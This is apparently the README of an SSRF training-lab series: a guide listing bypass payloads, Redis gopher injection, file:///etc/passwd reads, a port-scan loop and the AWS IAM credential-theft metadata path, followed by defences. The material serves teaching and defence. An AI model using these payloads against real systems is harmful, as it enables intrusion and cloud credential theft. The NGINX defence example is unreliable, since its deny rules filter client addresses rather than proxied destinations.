# Server-Side Request Forgery (SSRF) 

## Lab Levels

Jump directly to the lab writeups:

* [APPRENTICE](./APPRENTICE_Lab.md)
* [PRACTITIONER](./PRACTITIONER_Lab.md)
* [EXPERT](./EXPERT_Lab.md)

## Server-Side Request Forgery (SSRF) Vulnerability Guide

<p align="center">
  <img src="https://media.licdn.com/dms/image/v2/D4D12AQEdv6qTMsDaqg/article-cover_image-shrink_720_1280/article-cover_image-shrink_720_1280/0/1731662039422?e=2147483647&v=beta&t=Tz5aBcJ5DjZ6EPj70RACFpBcscEHFoRTtTmCEWGAAmc" alt="SSRF Diagram">
  <br>
  <em>Figure: SSRF attack flow demonstrating unauthorized internal network access</em>
</p>

---

## Table of Contents
- [Introduction](#introduction)
- [Tools](#tools)
- [Bypass Techniques](#bypass-techniques)
- [Exploitation Scenarios](#exploitation-scenarios)
- [HTTP Headers for SSRF](#http-headers-for-ssrf)
- [Defensive Measures](#defensive-measures)
- [References](#references)

---

## Introduction
**Server-Side Request Forgery (SSRF)** occurs when an attacker manipulates a vulnerable server to send crafted requests to internal or external systems on their behalf. It is commonly used to:
- Access internal services behind firewalls
- Extract metadata from cloud services (e.g., AWS, Azure, GCP)
- Perform port scans or pivot attacks
- Abuse trust boundaries

---

## Tools

| Tool       | Description                                  | Link |
|------------|----------------------------------------------|------|
| SSRFmap    | Automated SSRF exploitation tool             | [GitHub](https://github.com/swisskyrepo/SSRFmap) |
| Gopherus   | SSRF payload generator (Gopher, Redis, etc.) | [GitHub](https://github.com/tarunkant/Gopherus) |
| rbndr      | DNS rebinding testing and SSRF vector tool   | [GitHub](https://github.com/taviso/rbndr) |
| Interactsh | Out-of-band (OOB) detection platform         | [GitHub](https://github.com/projectdiscovery/interactsh) |

---

## Bypass Techniques

### 1. URL Obfuscation
```
http://expected-host@evil.com/
http://evil.com:80@expected.com:80/
````

### 2. DNS Tricks

```
http://169.254.169.254.nip.io
http://metadata.google.internal.attacker.com
http://[::ffff:a9fe:a9fe]
```

### 3. Protocol Schemes

```
gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aPING%0d%0a
dict://127.0.0.1:6379/INFO
file:///etc/passwd
```

### 4. Encoding Techniques

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
http://%6d%65%74%61%64%61%74%61%2e%67%6f%6f%67%6c%65%2e%69%6e%74%65%72%6e%61%6c
```

### 5. Cloud Metadata Endpoints

```
# AWS
http://169.254.169.254/latest/meta-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2020-09-01

```

---

## Exploitation Scenarios

### 1. Internal Service Port Scanning

```bash
for port in {1..65535}; do
    curl "http://vulnerable.com/fetch?url=http://127.0.0.1:$port" -m 1
done


```

### 2. Redis Unauthorized Command Injection

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...

```

# Injects a reverse shell via Redis cron manipulation



### 3. AWS IAM Role Credential Theft

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/

```

---

## HTTP Headers for SSRF

In some SSRF scenarios, the server may derive internal request parameters from HTTP headers. Abuse these headers to influence server-side routing:

### Common Headers That Can Trigger SSRF:

* `Host`: Spoofed host override
* `X-Forwarded-For`: Fakes source IP address
* `X-Forwarded-Host`: Overrides backend target
* `X-Forwarded-Proto`: Alters HTTP/HTTPS routing
* `Forwarded`: RFC-compliant combination of forwarding headers
* `Referer`: May influence behavior in redirection logic
* `Location`: Can be abused for SSRF via open redirects

```http
GET / HTTP/1.1
Host: internal.service
X-Forwarded-Host: 169.254.169.254
X-Forwarded-For: 127.0.0.1
```

---

## Defensive Measures

### 1. Input Validation

* Allowlist only specific hostnames and protocols
* Reject all private/reserved IP ranges (RFC1918, 127.0.0.1, etc.)

### 2. Network Layer Filtering (Example: NGINX)

```nginx
location /proxy {
    deny 10.0.0.0/8;
    deny 172.16.0.0/12;
    deny 192.168.0.0/16;
    deny 127.0.0.0/8;
    deny 169.254.0.0/16;
    proxy_pass $url;
}
```

### 3. Application Hardening

* Disable unused URL schemes (`gopher://`, `file://`, etc.)
* Normalize and parse URLs using secure libraries

### 4. Cloud-Specific Protections

* Enforce [AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html):

```bash
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
```

* Block access to metadata IP ranges from within applications or WAFs

---

## References

* [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
* [A New Era of SSRF - BlackHat USA 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
* [NCC Group Whitepaper - SSRF in Cloud Metadata APIs](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2019/july/ncc_group_whitepaper_ssrf_cloud_metadata_api.pdf)

---

